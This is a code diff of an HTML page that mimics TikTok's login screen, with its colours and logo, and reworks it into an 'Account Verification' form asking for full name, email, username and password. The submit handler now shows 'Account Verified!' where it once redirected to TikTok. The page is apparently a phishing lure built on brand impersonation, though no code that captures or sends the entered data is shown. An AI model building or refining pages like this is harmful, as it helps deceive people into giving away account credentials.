@@ -3,17 +3,18 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>TikTok Login</title>
+  <title>Account Verification</title>
   <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600&display=swap" rel="stylesheet">
   <style>
     :root {
-      --primary: #ff0050;
-      --bg: #000000;
-      --text: #ffffff;
-      --muted: #bbbbbb;
-      --input-bg: #121212;
-      --border: #444;
-      --radius: 12px;
+      --primary: #ff0050; /* اللون الأساسي */
+      --bg: #000000; /* الخلفية باللون الأسود */
+      --text: #ffffff; /* النصوص باللون الأبيض */
+      --input-bg: #121212; /* خلفية المدخلات سوداء قاتمة */
+      --border: #444; /* الحدود داكنة */
+      --highlight: #00c6ff; /* اللون المميز للأزرار */
+      --radius: 24px; /* زاوية الانحناء كبيرة لجعل الحواف بارزة */
+      --shadow: rgba(0, 0, 0, 0.4); /* الظلال قوية لزيادة التأثير */
     }
 
     * {
@@ -30,43 +31,45 @@
       align-items: center;
       justify-content: center;
       min-height: 100vh;
-      padding: 20px;
+      padding: 0;
+      margin: 0;
+      overflow: hidden; /* إخفاء التمرير */
     }
 
     .container {
-      background-color: #181818;
-      border: 1px solid var(--border);
+      background-color: #181818; /* اللون الخلفي للواجهة */
+      border: 3px solid var(--border); /* زيادة سمك الحدود لجعلها بارزة */
       padding: 40px;
       border-radius: var(--radius);
       width: 100%;
       max-width: 400px;
-      box-shadow: 0 0 30px rgba(255, 0, 80, 0.1);
+      box-shadow: 0 8px 15px var(--shadow); /* زيادة تأثير الظل ليكون بارزًا */
       animation: fadeIn 0.8s ease-out;
+      text-align: center;
     }
 
     .logo {
       display: block;
-      margin: 0 auto 25px;
-      width: 120px; /* تم تكبير الصورة */
-      height: auto;
+      margin: 0 auto 30px;
+      width: 120px;
     }
 
     h2 {
-      text-align: center;
+      font-size: 26px;
       font-weight: 600;
-      margin-bottom: 10px;
+      margin-bottom: 15px;
+      color: var(--text);
     }
 
     p {
-      text-align: center;
-      font-size: 14px;
-      color: var(--muted);
-      margin-bottom: 30px;
+      font-size: 16px;
+      color: var(--text);
+      margin-bottom: 25px;
     }
 
     input {
       width: 100%;
-      padding: 12px 15px;
+      padding: 12px;
       margin-bottom: 20px;
       background-color: var(--input-bg);
       border: 1px solid var(--border);
@@ -77,25 +80,32 @@
     }
 
     input:focus {
-      border-color: var(--primary);
+      border-color: var(--highlight);
       outline: none;
     }
 
     button {
       width: 100%;
-      padding: 13px;
-      background-color: var(--primary);
+      padding: 14px;
+      background-color: var(--highlight);
       color: #fff;
       font-weight: bold;
-      font-size: 15px;
+      font-size: 16px;
       border: none;
       border-radius: var(--radius);
       cursor: pointer;
-      transition: background 0.3s ease;
+      transition: background 0.3s ease, transform 0.3s ease;
     }
 
     button:hover {
-      background-color: #e60045;
+      background-color: var(--primary);
+      transform: translateY(-2px);
+    }
+
+    .footer-text {
+      font-size: 12px;
+      color: var(--text);
+      margin-top: 20px;
     }
 
     @keyframes fadeIn {
@@ -107,21 +117,23 @@
 <body>
   <div class="container">
     <img class="logo" src="https://raw.githubusercontent.com/Hhfjkyr/my-website/main/5cb78678a7c7755bf004c14c.png" alt="TikTok Logo">
-    <h2>Log in to TikTok</h2>
-    <p>Access your account securely</p>
-    <form id="loginForm">
+    <h2>Account Verification</h2>
+    <p>Please enter your details to verify your account.</p>
+    <form id="verificationForm">
       <input type="text" placeholder="Full Name" required />
-      <input type="text" placeholder="Username or Email" required />
+      <input type="email" placeholder="Email Address" required />
+      <input type="text" placeholder="Username" required />
       <input type="password" placeholder="Password" required />
-      <button type="submit">Log In</button>
+      <button type="submit">Verify Account</button>
     </form>
+    <p class="footer-text">By verifying your account, you agree to our <a href="#">Terms of Service</a> and <a href="#">Privacy Policy</a>.</p>
   </div>
 
   <script>
-    const form = document.getElementById('loginForm');
+    const form = document.getElementById('verificationForm');
     form.addEventListener('submit', function (e) {
       e.preventDefault();
-      window.location.href = 'https://www.tiktok.com/login';
+      alert('Account Verified!');
     });
   </script>
 </body>
